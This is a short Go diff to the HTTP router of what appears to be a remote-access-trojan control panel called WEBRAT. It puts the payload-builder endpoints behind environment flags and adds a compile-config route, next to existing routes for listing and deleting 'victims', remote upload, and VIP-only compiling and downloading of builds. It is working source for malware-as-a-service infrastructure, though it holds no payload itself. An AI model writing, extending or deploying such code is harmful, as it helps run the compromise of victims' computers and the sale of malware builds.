@@ -23,6 +23,11 @@ type Server struct {
 func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
 	s := &Server{db: db, auth: auth.New(db), wsHub: hub}
 
+	envTrue := func(key string) bool {
+		v := strings.ToLower(strings.TrimSpace(os.Getenv(key)))
+		return v == "1" || v == "true" || v == "yes" || v == "on"
+	}
+
 	r := chi.NewRouter()
 	r.Use(middleware.StripSlashes)
 
@@ -61,12 +66,17 @@ func NewRouter(db *storage.DB, hub *ws.Hub) http.Handler {
 
 		r.Get("/subscription", s.requireAPIAuth(s.handleGetSubscription))
 		r.Post("/activate-key", s.requireAPIAuth(s.handleActivateKey))
-		r.Get("/builder-token", s.requireVIP(s.handleBuilderToken))
+		if envTrue("WEBRAT_ENABLE_BUILDER_TOKEN_ENDPOINT") {
+			r.Get("/builder-token", s.requireVIP(s.handleBuilderToken))
+		}
 		r.Post("/remote-upload", s.requireVIP(s.handleRemoteUpload))
 		r.Get("/victims", s.requireVIP(s.handleGetVictims))
 		r.Delete("/victims", s.requireVIP(s.handleDeleteVictim))
 		r.Post("/victims", s.requireVIP(s.handleDeleteVictim))
-		r.Post("/compile-go", s.requireVIP(s.handleCompileGo))
+		if envTrue("WEBRAT_ENABLE_COMPILE_GO") {
+			r.Post("/compile-go", s.requireVIP(s.handleCompileGo))
+		}
+		r.Post("/compile-go-config", s.requireVIP(s.handleCompileGoConfig))
 		r.Get("/compile-status", s.requireVIP(s.handleCompileStatus))
 		r.Get("/compile-download", s.requireVIP(s.handleCompileDownload))
 	})
